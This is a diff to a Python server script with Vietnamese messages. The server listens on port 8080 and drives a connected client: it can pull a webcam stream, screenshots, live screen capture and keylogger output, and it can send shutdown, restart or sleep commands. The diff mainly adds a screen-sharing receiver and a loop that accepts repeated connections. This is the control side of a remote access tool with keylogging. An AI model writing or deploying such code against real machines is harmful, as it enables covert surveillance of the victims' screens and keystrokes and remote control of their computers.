@@ -50,20 +50,18 @@ def receive_screenshot(conn):
         return
     msglen = struct.unpack("L", raw_msglen)[0]
 
-    # B2: Nhận đủ số lượng bytes của bức ảnh
     frame_data = recvall(conn, msglen)
     if frame_data is None:
         print("Dữ liệu ảnh bị lỗi.")
         return
 
-    # B3: Giải mã và hiển thị tấm ảnh đơn lẻ lên
     nparr = np.frombuffer(frame_data, np.uint8)
     frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
 
     cv2.imshow('Remote Screenshot', frame)
     print("👉 Đã hiển thị ảnh! Hãy click vào cửa sổ ảnh và bấm PHÍM BẤT KỲ để tiếp tục gõ lệnh.")
-    cv2.waitKey(0)  # Số 0 nghĩa là đứng yên đợi cho đến khi người dùng bấm phím bất kỳ
-    cv2.destroyWindow('Remote Screenshot')  # Đóng cửa sổ ảnh chụp màn hình lại
+    cv2.waitKey(0)
+    cv2.destroyWindow('Remote Screenshot')
 
 
 def receive_key_logger(conn):
@@ -103,38 +101,78 @@ def receive_screen(conn):
             
     cv2.destroyAllWindows()
 
+def receive_screen(conn):
+    print("Đang nhận luồng chia sẻ màn hình... (Bấm 'q' trên cửa sổ video để thoát)")
+    payload_size = struct.calcsize("L")
+    while True:
+        raw_msglen = recvall(conn, payload_size)
+        if not raw_msglen:
+            break
+        msglen = struct.unpack("L", raw_msglen)[0]
 
+        frame_data = recvall(conn, msglen)
+        if frame_data is None:
+            break
 
+        nparr = np.frombuffer(frame_data, np.uint8)
+        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
 
+        cv2.imshow('Live Screen Sharing', frame)
 
-# --- PHẦN LUỒNG CHÍNH CỦA SERVER ---
+        if cv2.waitKey(1) & 0xFF == ord('q'):
+            break
+
+    cv2.destroyAllWindows()
+
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(('0.0.0.0', 8080))
 server.listen(1)
 
-print("Đang chờ kết nối...")
-conn, addr = server.accept()
-print(f"Đã kết nối với {addr}")
+try:
+    while True:
+        print("\n[+] Đang chờ kết nối mới từ client...")
+        conn, addr = server.accept()
+        print(f"[+] Đã kết nối thành công với: {addr}")
 
-conn.sendall(b'Hello from server!')
-messages = conn.recv(1024).decode()
-print(messages)
+        try:
+            conn.sendall(b'Hello from server!')
+            messages = conn.recv(1024).decode('utf-8')
+            print(f"[*] Phản hồi từ client: {messages}")
 
-cmd = input('enter command: ')
-while cmd != 'exit':
-    conn.sendall(bytes(cmd, 'utf-8'))
+            while True:
+                cmd = input('\nenter command (type "exit" to kick client): ').strip()
 
-    if cmd == 'stream':
-        receive_stream(conn)
-    elif cmd == 'screenshot':
-        receive_screenshot(conn)
-    elif cmd == 'keylogger':
-        receive_key_logger(conn)
-    elif cmd == 'screen': 
-        receive_screen(conn)
-    elif cmd == 'power':
-        cmd = input('what power mdoe: ')
-        conn.sendall(bytes(cmd, 'utf-8'))
-    cmd = input('enter command: ')
+                if not cmd:
+                    continue
 
-conn.close()
+                if cmd == 'exit':
+                    conn.sendall(b'exit')
+                    print("[*] Exiting session with current client.")
+                    break
+                if cmd == 'power':
+                    sub_cmd = input('what power mode (shutdown/restart/sleep): ').strip()
+                    cmd = f"power:{sub_cmd}"
+                conn.sendall(bytes(cmd, 'utf-8'))
+                if cmd == 'stream':
+                    receive_stream(conn)
+                elif cmd == 'screenshot':
+                    receive_screenshot(conn)
+                elif cmd == 'keylogger':
+                    receive_key_logger(conn)
+                elif cmd == 'screen':
+                    receive_screen(conn)
+                elif cmd == 'power:sleep':
+                    print("[*] Sent sleep command. Client is disconnecting to sleep...")
+                    break
+
+        except (socket.error, ConnectionResetError, BrokenPipeError) as e:
+            print(f"\n[-] Client connection lost abruptly: {e}")
+
+        finally:
+            print("[*] Closing current client socket handle.")
+            conn.close()
+
+except KeyboardInterrupt:
+    print("\n[-] Server shutting down manually.")
+finally:
+    server.close()
